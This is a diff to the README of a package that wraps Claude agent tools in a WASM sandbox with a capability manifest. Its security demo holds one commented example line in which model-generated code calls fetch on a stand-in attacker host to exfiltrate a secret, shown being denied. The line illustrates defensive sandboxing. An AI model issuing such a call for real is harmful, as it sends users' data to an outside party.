@@ -21,6 +21,30 @@ This package gives you a `ClaudeAgentTool` backed by a wasmagent kernel
 Pick a tier; pick a manifest; the tool drops straight into the agent SDK's
 `tools` array.
 
+## Before / After
+
+Replacing the Anthropic `bash_20250124` tool with a wasmagent WASM kernel:
+
+```diff
++import { sandboxedJsClaudeTool } from "@wasmagent/claude-agent-sdk";
++import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+ const response = await client.beta.messages.create({
+   model: "claude-opus-4-5",
+   tools: [
+-    { type: "bash_20250124" },   // ← executes on the host, full OS access
++    sandboxedJsClaudeTool({
++      kernel: new QuickJSKernel(),   // ← WASM sandbox, no host shell
++      capabilities: { allowedHosts: [] },
++    }),
+   ],
+ });
+```
+
+The `sandboxedJsClaudeTool` returns the same `{ name, description, input_schema }`
+shape the SDK expects, so no other change is required. The WASM kernel runs inside
+the same process — no container, no remote shell.
+
 ## Install
 
 ```bash
@@ -74,6 +98,34 @@ one line, the rest of your code is unchanged:
 | `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |
 
 Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same Claude Agent SDK tool shape.
+
+## Security demo
+
+`CapabilityManifest` enforces network and filesystem policy at the kernel
+boundary — the model cannot escape it regardless of what code it generates:
+
+```ts
+import { sandboxedJsClaudeTool } from "@wasmagent/claude-agent-sdk";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+const kernel = new QuickJSKernel();
+const tool = sandboxedJsClaudeTool({
+  kernel,
+  capabilities: {
+    allowedHosts: [],           // no outbound network
+    allowedPaths: [],           // no filesystem access
+    cpuMs: 5_000,
+    memoryLimitBytes: 64 * 1024 * 1024,
+  },
+});
+
+// Model-generated code that tries to exfiltrate data:
+// fetch("https://attacker.example/exfil?data=secret")
+// → throws: network access denied — host "attacker.example" not in allowedHosts
+```
+
+The same manifest applies to both `sandboxedJsClaudeTool` and `codeModeClaudeTool`,
+and it is the same object shape as every other wasmagent kernel adapter.
 
 ## Capability manifest
 
